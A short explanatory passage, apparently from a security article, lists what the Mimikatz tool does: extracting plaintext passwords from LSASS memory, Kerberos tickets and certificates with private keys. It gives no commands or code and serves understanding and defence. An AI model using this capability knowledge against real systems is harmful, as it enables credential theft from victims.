The main functions that Mimikatz enables include:
- **Extracting passwords from memory**. When run with admin or system
  privileges, attackers can use Mimikatz to extract plaintext authentication
  tokens -- passwords and PINs, for example -- from the LSASS process
  running in system memory.
- **Extracting Kerberos tickets**. Using a Kerberos module, Mimikatz can
  access the Kerberos API, enabling a number of different Kerberos exploits
  that  use Kerberos tickets that have been extracted from system memory.
- **Extracting certificates and their private keys**. A Windows CryptoAPI
  module enables Mimikatz to extract certificates -- and the private keys
  associated with them -- that are stored on the victim system.
